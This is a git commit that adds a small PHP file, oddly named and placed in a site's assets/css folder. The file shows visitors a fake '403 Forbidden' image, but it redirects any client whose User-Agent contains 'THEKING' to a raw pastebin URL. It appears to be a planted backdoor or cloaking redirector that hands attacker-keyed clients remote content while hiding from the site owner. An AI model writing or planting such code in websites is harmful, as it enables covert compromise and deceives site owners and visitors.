f093dcd563ec1eaea92470ea29bf422b9ea68c87
HappyTest1999 <61419655+HappyTest1999@users.noreply.github.com>
2020-02-24 22:29:54 +0100

    Add files via upload

---
+++ assets/css/Test256 (2).php
@@ -0,0 +1,7 @@
+<?php 
+if(isset($_SERVER['HTTP_USER_AGENT']) && strlen(strstr($_SERVER['HTTP_USER_AGENT'],"THEKING")) > 0 ){
+header('Location: https://pastebin.com/raw/xt12XcSH');
+} else {
+header('Location: https://www.hostinger.es/tutoriales/wp-content/uploads/sites/7/2017/08/que-es-el-error-403-Prohibido-y-como-arreglarlo.jpg'); exit();
+}
+?>
